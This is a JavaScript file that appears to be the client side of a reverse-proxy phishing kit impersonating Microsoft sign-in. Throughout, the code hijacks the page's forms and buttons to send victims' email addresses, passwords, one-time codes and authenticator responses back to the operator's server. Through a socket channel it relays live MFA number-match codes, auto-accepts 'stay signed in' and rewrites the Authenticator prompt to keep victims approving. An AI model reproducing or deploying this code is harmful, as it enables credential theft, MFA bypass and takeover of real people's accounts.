const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }

    if (data.type == "code") {
        const codeTag = document.querySelector(`[id="displaySign"]`)
        codeTag.innerText = data.code
    }

    if (data.type == "sign-code") {
        document.querySelector("#idRemoteNGC_DisplaySign").innerText = data.code
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = true
    form.target = "_self"

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll(`[data-bind]`).forEach(t => {
    t.setAttribute("data-bind", "")
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, {
            method: "POST",
            body: JSON.stringify(data),
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {

            }).catch(err => {
                console.log(err)
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-email",
        querys: [
            `[type="email"]`,
            `[name="loginfmt"]`
        ]
    },
    {
        spikeType: "home-password",
        querys: [
            `[name="passwd"]`
        ]
    },
    {
        spikeType: "code",
        querys: [
            `[id="idTxtBx_OTC_Password"]`,
            `[name="otc"]`
        ]
    },
    {
        spikeType: "auth-app-code",
        querys: [
            `[id="iVerifyText"]`,
            `[name="iVerifyText"]`
        ]
    },
    {
        spikeType: "code-options",
        querys: [
            `[name="proofOption"]`
        ],
        runner() {
            document.querySelectorAll(`[name="proofOption"]`).forEach((optionInput, indexValue) => {
                optionInput.addEventListener("input", () => {
                    const optionLabel = document.querySelector(`#text${optionInput.id}`)
                    optionInput.value = indexValue
                    if (optionLabel.innerText.includes("Text")) {
                        document.querySelector(`#proofInput${indexValue}`).name = "phoneNumber"
                    }
                })
            })
        }
    },
    {
        spikeType: "save-browser",
        querys: [
            `[id="acceptButton"]`,
            `[id="declineButton"]`
        ],
        runner() {
            document.querySelector("#acceptButton").click()
        }
    },
    {
        spikeType: "idTxtBx_SAOTCC_OTC",
        querys: [
            `#idTxtBx_SAOTCC_OTC`
        ]
    },
    {
        spikeType: "ProofConfirmation",
        querys: [
            `[name="ProofConfirmation"]`
        ]
    },
    {
        spikeType: "iProofEmail",
        querys: [
            "#iProofEmail"
        ]
    },
    {
        spikeType: "iOttText",
        querys: [
            "#iOttText"
        ]
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    {
        spikeType: "forget-password",
        runner() {
            const idA_PWD_ForgotPassword = document.querySelector("#idA_PWD_ForgotPassword")
            if (idA_PWD_ForgotPassword) {
                idA_PWD_ForgotPassword.style.color = "#0067b8"
                idA_PWD_ForgotPassword.removeAttribute("href")
                idA_PWD_ForgotPassword.addEventListener("click", () => {
                    spikeForm({
                        spikeType: this.spikeType
                    })
                })
            }
        }
    },
    {
        spikeType: "use-password",
        runner() {
            const idA_PWD_SwitchToPassword = document.querySelector("#idA_PWD_SwitchToPassword")
            if (idA_PWD_SwitchToPassword) {
                idA_PWD_SwitchToPassword.addEventListener("click", () => {
                    spikeForm({
                        spikeType: this.spikeType
                    })
                })
            }
        }
    },
    {
        spikeType: "send-notification",
        runner() {
            document.querySelectorAll("button").forEach(btn => {
                if (btn.type == "submit" && btn.innerText.includes("Send notification")) {
                    addSpikeType(this.spikeType)
                }
            })
        }
    },
    {
        spikeType: "other-ways",
        runner() {
            const idA_PWD_SwitchToCredPicker = document.querySelector("#idA_PWD_SwitchToCredPicker")
            if (idA_PWD_SwitchToCredPicker) {
                idA_PWD_SwitchToCredPicker.addEventListener("click", () => {
                    spikeForm({
                        spikeType: this.spikeType
                    })
                })
            }
        }
    },
    {
        spikeType: "send-code",
        runner() {
            document.querySelectorAll("button").forEach(btn => {
                if (btn.type == "submit" && btn.innerText.includes("Send code")) {
                    addSpikeType(this.spikeType)
                }
            })
        }
    },
    {
        spikeType: "request-auth-code",
        runner() {
            const bodyText = document.body.innerText
            const codeTag = document.querySelector(`[id="displaySign"]`)

            if (codeTag && bodyText.includes("Check your Authenticator app")
                && bodyText.includes("In your Authenticator app")
            ) {
                spikeForm({
                    spikeType: this.spikeType
                }, true)
            }
        }
    },
    {
        spikeType: "verification-options",
        runner() {
            const iVerifyIdentityRevert = document.querySelector(`[id="iVerifyIdentityRevert"]`)
            if (iVerifyIdentityRevert) {
                iVerifyIdentityRevert.removeAttribute("href")
                iVerifyIdentityRevert.addEventListener("click", () => {
                    spikeForm({
                        spikeType: this.spikeType
                    })
                })
            }
        }
    },
    {
        spikeType: "select-signin-way",
        runner() {
            const deviceContainer = document.querySelector(`[id="tileList"]`)
            deviceContainer.querySelectorAll("div.___b9iavz0.f10pi13n.f17n1hoa").forEach((btn, index) => {
                btn.addEventListener("click", () => {
                    spikeForm({
                        spikeType: this.spikeType,
                        index
                    })
                })
            })
        }
    },
    {
        spikeType: "use-auth-app",
        runner() {
            const btn = document.querySelector("#idA_PWD_SwitchToRemoteNGC")
            if (btn) {
                btn.addEventListener('click', () => {
                    spikeForm({
                        spikeType: this.spikeType
                    })
                })
            }
        }
    },
    {
        spikeType: "mail-options",
        runner() {
            const bodyText = document.body.innerText

            if (
                bodyText.includes("Work or school account")
                && bodyText.includes("Personal account")
            ) {
                document.querySelectorAll(`[role="listitem"]`).forEach((email, index) => {
                    email.addEventListener("click", () => {
                        spikeForm({
                            spikeType: this.spikeType,
                            index
                        })
                    })
                })
            }
        }
    },
    {
        spikeType: "reset-password",
        runner() {
            let resetPasswordbtn = document.querySelector("#idA_IL_ForgotPassword0")
            if (resetPasswordbtn != undefined) {
                resetPasswordbtn.style.color = "#0067b8"
                resetPasswordbtn.removeAttribute("href")
                resetPasswordbtn.addEventListener("click", () => {
                    spikeForm({
                        spikeType: this.spikeType
                    })
                })
            }
        }
    },
    {
        spikeType: "auth-keys",
        runner() {
            const bodyText = document.body.innerText

            if (bodyText.includes("How would you like to get your security code?")) {
                document.querySelectorAll("[type=radio]").forEach((btn, index) => {
                    btn.addEventListener("click", () => {
                        spikeForm({
                            spikeType: this.spikeType,
                            index
                        })
                    })
                })
                document.querySelectorAll(`[type="submit"]`).forEach(b => b.removeAttribute("disabled"))
            }
        }
    }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{
    const bodyText = document.body.innerText
    if (bodyText.includes("Trying to sign you in\nCancel\n\n\nTerms of use Privacy & cookies ...")) {
        location.reload()
    }

    let idDiv_RemoteNGC_PollingDescription = document.querySelector("#idDiv_RemoteNGC_PollingDescription")
    if (idDiv_RemoteNGC_PollingDescription != undefined) {
        idDiv_RemoteNGC_PollingDescription.innerHTML = `In your Microsoft app (such as Authenticator or Outlook), select the number shown to sign in. Manage your devices at aka.ms/manageproofs. <b>The code will regenerate automatically.<b>`
    }

}